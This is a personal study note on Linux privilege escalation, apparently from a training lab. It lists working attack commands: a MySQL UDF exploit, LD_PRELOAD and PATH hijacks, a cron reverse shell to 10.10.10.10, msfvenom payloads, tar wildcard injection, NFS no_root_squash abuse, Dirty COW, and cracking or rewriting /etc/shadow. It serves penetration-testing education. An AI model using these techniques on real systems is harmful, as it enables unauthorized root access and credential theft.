---
title: Privilege Escalation
updated: 2025-01-11 22:27:06Z
created: 2024-02-22 07:18:02Z
---

# Privilege Escalation
- Tools: LinEnum - Privesc
- Always include a check list of what to try
- Commands to remember:
	- `id` show the current user priviledge
	- `Sudo -l`: show what command can be run as root user
	- `[command] -p` run with root priviledge
- Methods:
	- Abusing SUID/GUID
	- rewrite: `/etc/passwd`
		- Vi editor: if it has been misconfigured run vi as sudo, then `sudo vi`
	- [Misconfigured Binaries and GTFOBins](https://gtfobins.github.io/)
	- Crontab: `cat /etc/crontab`
	- Path variable: abuse the SUID binary and the system shell to run an executable
		- `export PATH=[directory]:$PATH`
		- access root shell using the system PATH by "imitating a bash shell"
			- create a fake 'ls' file (which bash shell as content) and add to the path
			- when real ls is needed, they can be accessed via `bin/ls`
	- More
		- [Linux Privilege Escalation](https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md)
		- [payload all the thing - privesc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
		- [OSCP privesc](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html)

## Service Exploits
- Use [User defined function (UDF) exploit](https://www.exploit-db.com/exploits/1518) to run system commands as root via the MySQL service
	- This exploit takes the advantages of the MySQL service running as root and the "root" user for the service does not have a password assigned
- Steps:
	- download exploit "mysql-udf"
	- Compile the raptor_udf2.c exploit code
	> gcc -g -c raptor_udf2.c -fPIC
	> gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
	- Connect to the MySQL service as the root user with a blank password:
	> mysql -u root
	- Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do_system" using our compiled exploit:
	> use mysql;
	> create table foo(line blob);
	> insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
	> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
	> create function do_system returns integer soname 'raptor_udf2.so';
	- Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:
	> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
	- Exit out of the MySQL shell (type exit or \q and press Enter) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
	> /tmp/rootbash -p
	
## Weak file permission
### Readable /etc/shadow
- Normally readable only by the root user.
- take the hash in the shadow file and crack it.
- e.g. `root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::`
	- hash: `$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298`
### Writable /etc/shadow
- Generate a new password and replace with the root password in the shadow file
	- `mkpasswd -m sha-512 newpasswordhere`
### Writable /etc/passwd
- Replace root password: Generate a new password and replace with the root password in the passwd file
	- `openssl passwd newpasswordhere`
- Create new root user: copy the root row to the bottom and add hash password of the choice

## Sudo
### Shell escape sequence
- Use the users limited root priviledge to gain access to the root shell (use `Sudo -l`)
- Command and methods are listed here: [GTFOBins](https://gtfobins.github.io/)

### Enviroment variables
- `Sudo -l` can see the current user enviroment variable
- `LD_PRELOAD` and `LD_LIBRARY_PATH` are both inherited from the user's environment
	- `LD_PRELOAD` loads a shared object before any others when a program is run. 
		- `gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c`
			- `preload.c` is the payload
			- `sudo LD_PRELOAD=/tmp/preload.so [any sudo -l program]`
	- `LD_LIBRARY_PATH` provides a list of directories where shared libraries are searched for first
		- `ldd /usr/sbin/apache2` see which shared libraries are used by the program
		- `gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c` 
			- Create a shared object with the same name as one of the listed libraries
			- `library_path.c` is the payload
			- `sudo LD_LIBRARY_PATH=/tmp apache2` set the `LD_LIBRARY_PATH` to where our output is

## Cron Jobs
- replace the original shell with reverse shell payload
- Take advantages of the wildcard, wether in script or out of script
- File permission
> #!/bin/bash
 > bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
- PATH enviroment variables
	- Note that the `/home/user` in the path takes precedence, if we create the same filename in the home directory, this will take precedence
- Wildcard
	- `tar` command has checkpoint in case of failure, use filename as command and feed it to `tar` can makes a payload to run
	> msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
	> chmod +x /home/user/shell.elf
	> # Target machine
	> # have shell.elf file
	> touch /home/user/--checkpoint=1
	> touch /home/user/--checkpoint-action=exec=shell.elf

## SUID/GUID
### Known exploits
- Find all files with SUID/GUID on the system: `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
- if found some known exploit, such as `exim-4.84-3` in this case, the exploit can be found on the exploit databases
### shared object injection
- Use the object path that a certain command is using, let the command run and call that object
	- e.g. `/usr/local/bin/suid-so` command
	- Trace what this command is calling `strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"`
	- Make directory `mkdir /home/user/.config`
	- compile an object (which returns a bash shell) with the same name `gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c`
	- Run the command again `/usr/local/bin/suid-so`
### Enviroment Variables
- See how a service is started`strings /usr/local/bin/suid-env`, this shows that it will call `service apache2 start` to start the service
- we can fake "service" command if service is not using an absolute path
- `gcc -o service /home/user/tools/suid/service.c` use the payload and create a file that has the same "service" name
- Prepend the path to the variable before it reaches the true path `PATH=.:$PATH /usr/local/bin/suid-env`
### Abusing shell feature #1
- Bash version <4.2-048 can accept function name to be named like a path name:
- e.g. in the bash version, we can name a function with name of  `/usr/sbin/service`, which takes prcedence of the service command
> function /usr/sbin/service { /bin/bash -p; } # create the function with specified path name
> export -f /usr/sbin/service # add this function to the enviroment
- When the command with `/usr/sbin/service` is run, this function is being called
- Step by step example: if `/usr/local/bin/suid-env2` has SUID/SGID set:
> strings /usr/local/bin/suid-env2
> /bin/bash --version
> function /usr/sbin/service { /bin/bash -p; }
> export -f /usr/sbin/service
> /usr/local/bin/suid-env2
### Abusing shell feature #2
- Not work on Bash versions 4.4 and above.
- When in debugging mode, the environment variable `PS4` can display an extra prompt for debugging
- run `/usr/local/bin/suid-env2` + debugging enabled + PS4 enviroment variable embedded SUID paylaod
	- `env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2`
	- `/tmp/rootbash -p` run the root that was created by PS4

## Password and Keys
### History files
- review the history file that might contain the password mistyped on the command line
- view content of the hiddent history `cat ~/.*history | less`
### Config files
- Some of the configuration file might include an authentication password in another address
### SSH Keys
- Double check if there is a backup ssh file key with mis configured permission, use that to connect to the machine
- `ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.10.152.118`

## NFS
- Files created via NFS inherit the remote user's ID
- ID set to the "nobody" user = if user is root + root squashing is enabled
- `cat /etc/exports` see if any no_root_squash set
- Example step
	- Mount the nfs share on the host
		- `mkdir /tmp/nfs`
		- `mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs`
	- Upload a payload that runs bash shell + update permission
		- `msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf`
		- `chmod +xs /tmp/nfs/shell.elf`
	- On the target machine, run the uploaded file `shell.elf`

## Kernel Exploits
- Kernel exploits can leave the system in an unstable state, ONLY run them as a last resort.
- "Linux Exploit Suggester 2"
	- identify potential kernel exploits on the current system
	- `perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl`
		- One of the exploit is "Dirty COW": It replaces the SUID file `/usr/bin/passwd` with one that spawns a shell
	- This command run the exploit
> gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
> ./c0w
- Once complete run `/usr/bin/passwd`
